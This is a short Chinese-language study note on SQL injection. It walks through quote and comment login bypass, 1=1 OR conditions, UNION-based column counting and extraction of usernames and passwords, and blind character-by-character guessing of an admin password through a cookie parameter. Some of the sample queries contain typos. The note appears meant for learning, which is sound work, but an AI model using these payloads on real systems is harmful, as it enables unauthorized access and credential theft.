# SQL注入

作者: fbk
时间：2023-1-16
地点：济南
>足够优秀再大方拥有
## 报错与注释
- 在不知道用户名的情况下
```sql
select * from users where username='fbk''and password='mime'
```
很显然，上边的sql语句出现了小括号不匹配的情况，mysql会把fbk设置一个字符串，把and password=视为另一个字符串，这就导致mysql会把报错的信息回传
- 在知道用户名但是不知道密码的情况下
```sql
select * from users where username='fbk' --'and password='mima'
```
sql会默认吧--后边的信息设置为注释信息
- 在知道不知道用户名的情况下
```sql
select * from users where 1=1 or username='fbk' or password='123456'
```
## union
```sql
select * from table1 union select 
--在union连接表后select可以不加查询表的名字
```
union的操作必须保证合并两边的列数是一致的，所以我们可以判断一个表中有多少列
```sql
select * from table1 union select null
select * from table1 union select null,null
select * from table1 union select null,null,null,null
```
一直重复不断地测试就可以知道有多少列了

如果知道了一个表的名字，我们就可以进行查询
```sql
select * from table1 union select null,null,null from allusers

select * from table1 union select username,password,null from allusers
```
但是使用union进行联立，我们还要注意查询的字段类型是否匹配，可以使用sql注释
```sql
select * from products where name='fbk' union select null,username,password from users --'
```
## 使用cookie进行sql注入
```sql
select cookiedld from allUsers wher ecookied='fbk12e12re21' and SUBSTRING('password',1,1) ='m' --'
```
如果说sql语句注入成功，但是页面不发生变化，则说明我们猜中了密码的第一个字符是m
```sql
select cookiedld from allUsers wher ecookied='fbk12e12re21'and SUBSTRING((select password from users where username=='admin'),1,1)='a'
select cookiedld from allUsers wher ecookied='fbk12e12re21'and SUBSTRING((select password from users where username=='admin'),1,1)='b'
select cookiedld from allUsers wher ecookied='fbk12e12re21'and SUBSTRING((select password from users where username=='admin'),1,1)='c'
```
前提是我们已经知道了管理员的账户是admin并且username和password储存在同一个表中，我们就可以进行判断，直到页面没有跳转，说明我们验证到了密码第一个字符